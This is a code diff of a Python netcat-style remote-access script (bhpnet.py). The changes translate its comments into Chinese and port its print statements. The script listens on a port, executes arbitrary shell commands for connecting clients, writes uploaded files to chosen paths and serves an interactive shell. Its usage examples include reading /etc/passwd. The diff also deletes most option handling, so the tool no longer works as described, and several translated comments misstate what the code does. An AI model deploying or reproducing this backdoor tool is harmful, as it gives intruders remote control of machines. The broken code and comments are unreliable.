@@ -1,5 +1,4 @@
-#!/opt/local/bin/python2.7
-
+#coding=utf-8
 import sys
 import socket
 import getopt
@@ -7,7 +6,7 @@ import threading
 import subprocess
 
 
-# define some global variables
+# 定义一些全局变量
 listen             = False
 command            = False
 upload             = False
@@ -16,34 +15,34 @@ target             = ""
 upload_destination = ""
 port               = 0
 
-# this runs a command and returns the output
+# 运行命令并返回输出
 def run_command(command):
         
-        # trim the newline
+        # 换行
         command = command.rstrip()
         
-        # run the command and get the output back
+        # 运行命令并将输出返回
         try:
                 output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
         except:
                 output = "Failed to execute command.\r\n"
-        
-        # send the output back to the client
+    
+        # 向客户端返回输出
         return output
 
-# this handles incoming client connections
+# 客户端连接
 def client_handler(client_socket):
         global upload
         global execute
         global command
         
-        # check for upload
+        # 检测上传文件
         if len(upload_destination):
                 
-                # read in all of the bytes and write to our destination
+                # 读取所有的字符并写下目标
                 file_buffer = ""
                 
-                # keep reading data until none is available
+                # 持续读取数据直到没有符合的数据
                 while True:
                         data = client_socket.recv(1024)
                         
@@ -52,53 +51,53 @@ def client_handler(client_socket):
                         else:
                                 file_buffer += data
                                 
-                # now we take these bytes and try to write them out
+                # 现在接收这些数据并输出
                 try:
                         file_descriptor = open(upload_destination,"wb")
                         file_descriptor.write(file_buffer)
                         file_descriptor.close()
                         
-                        # acknowledge that we wrote the file out
+                        # 确认文件已经写出来
                         client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
                 except:
                         client_socket.send("Failed to save file to %s\r\n" % upload_destination)
                         
                 
         
-        # check for command execution
+        # 检查命令执行
         if len(execute):
                 
-                # run the command
+                # 运行命令
                 output = run_command(execute)
                 
                 client_socket.send(output)
         
         
-        # now we go into another loop if a command shell was requested
+        # 如果需要一个命令行shell，进入另一个循环
         if command:
                 
                 while True:
-                        # show a simple prompt
+                        # 跳出一个窗口
                         client_socket.send("<BHP:#> ")
                         
-                        # now we receive until we see a linefeed (enter key)
+                        # 现在接收文件直到发现换行符(enter key)
                         cmd_buffer = ""
                         while "\n" not in cmd_buffer:
                                 cmd_buffer += client_socket.recv(1024)
                 
                         
-                        # we have a valid command so execute it and send back the results
+                        # 返还命令输出
                         response = run_command(cmd_buffer)
                         
-                        # send back the response
+                        # 返回响应数据
                         client_socket.send(response)
         
-# this is for incoming connections
+# 用于传入连接
 def server_loop():
         global target
         global port
         
-        # if no target is defined we listen on all interfaces
+        # 如果没有定义目标则监听所有接口
         if not len(target):
                 target = "0.0.0.0"
                 
@@ -110,7 +109,7 @@ def server_loop():
         while True:
                 client_socket, addr = server.accept()
                 
-                # spin off a thread to handle our new client
+                # 分拆一个线程处理新的客户端
                 client_thread = threading.Thread(target=client_handler,args=(client_socket,))
                 client_thread.start()
                 
@@ -121,19 +120,17 @@ def client_sender(buffer):
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 
         try:
-                # connect to our target host
+                # 连接到目标主机
                 client.connect((target,port))
                 
-                # if we detect input from stdin send it 
-                # if not we are going to wait for the user to punch some in
-                
+                # 如果发现输入，发送它；如果没有，就等待输入                
                 if len(buffer):
                         
                         client.send(buffer)
                 
                 while True:
                         
-                        # now wait for data back
+                        # 等待数据回传
                         recv_len = 1
                         response = ""
                         
@@ -145,41 +142,41 @@ def client_sender(buffer):
                                 if recv_len < 4096:
                                         break
                         
-                        print(response )
+                        print(response)
                         
-                        # wait for more input
+                        # 等待更多的输入
                         buffer = raw_input("")
                         buffer += "\n"                        
                         
-                        # send it off
+                        # 发送出去
                         client.send(buffer)
                         
                 
         except:
-                # just catch generic errors - you can do your homework to beef this up
-                print "[*] Exception! Exiting."
                 
-                # teardown the connection                  
+                print ("[*] Exception! Exiting.")
+                
+                # 关闭连接                 
                 client.close()  
                         
                         
         
 
 def usage():
-        print "Netcat Replacement"
-        print
-        print "Usage: bhpnet.py -t target_host -p port"
-        print "-l --listen                - listen on [host]:[port] for incoming connections"
-        print "-e --execute=file_to_run   - execute the given file upon receiving a connection"
-        print "-c --command               - initialize a command shell"
-        print "-u --upload=destination    - upon receiving connection upload a file and write to [destination]"
-        print
-        print
-        print "Examples: "
-        print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
-        print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
-        print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
-        print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
+        print ("Netcat Replacement")
+        print ()
+        print ("Usage: bhpnet.py -t target_host -p port")
+        print ("-l --listen                - listen on [host]:[port] for incoming connections")
+        print ("-e --execute=file_to_run   - execute the given file upon receiving a connection")
+        print ("-c --command               - initialize a command shell")
+        print ("-u --upload=destination    - upon receiving connection upload a file and write to [destination]")
+        print ()
+        print ()
+        print ("Examples: ")
+        print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
+        print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
+        print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
+        print ("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
         sys.exit(0)
 
 
@@ -194,11 +191,11 @@ def main():
         if not len(sys.argv[1:]):
                 usage()
                 
-        # read the commandline options
+        # 读取命令行选项 
         try:
                 opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
         except getopt.GetoptError as err:
-                print str(err)
+                print (str(err))
                 usage()
                 
                 
@@ -206,14 +203,6 @@ def main():
                 if o in ("-h","--help"):
                         usage()
                 elif o in ("-l","--listen"):
-                        listen = True
-                elif o in ("-e", "--execute"):
-                        execute = a
-                elif o in ("-c", "--commandshell"):
-                        command = True
-                elif o in ("-u", "--upload"):
-                        upload_destination = a
-                elif o in ("-t", "--target"):
                         target = a
                 elif o in ("-p", "--port"):
                         port = int(a)
@@ -221,20 +210,19 @@ def main():
                         assert False,"Unhandled Option"
         
 
-        # are we going to listen or just send data from stdin
+        # 判断是进行监听还是仅从标准输入发送数据
         if not listen and len(target) and port > 0:
                 
-                # read in the buffer from the commandline
-                # this will block, so send CTRL-D if not sending input
-                # to stdin
+                # 从命令行读取内存数据
+                # 此处将阻塞，所以不再向标准输入发送数据时发送CTRL-D
                 buffer = sys.stdin.read()
                 
-                # send data off
+                # 发送数据
                 client_sender(buffer)   
         
-        # we are going to listen and potentially 
-        # upload things, execute commands and drop a shell back
-        # depending on our command line options above
+        # 开始监听并准备上传文件、执行命令 
+        # 放置一个反弹shell
+        # 取决于上面的命令行选项
         if listen:
                 server_loop()
 
